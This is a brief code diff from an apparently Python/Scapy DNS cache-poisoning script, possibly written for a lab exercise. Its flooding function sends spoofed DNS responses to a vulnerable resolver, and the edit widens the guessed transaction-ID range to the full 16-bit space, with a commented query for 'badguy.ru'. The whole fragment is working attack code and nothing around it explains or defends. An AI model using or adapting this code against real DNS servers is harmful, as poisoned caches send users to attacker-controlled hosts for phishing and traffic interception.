@@ -143,7 +143,7 @@ def flooding_job(passo):
                 # send(IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / DNS(rd=1, qd=DNS(qname="badguy.ru")))
 
                 # build the packet
-                q_id = ((Q_ID + 1 + passo*step + count) % 1160)
+                q_id = ((Q_ID + 1 + passo*step + count) % 65535)
                 print ('trying with ' + str(hex(q_id)))
                 pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
                       DNS(id= q_id, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
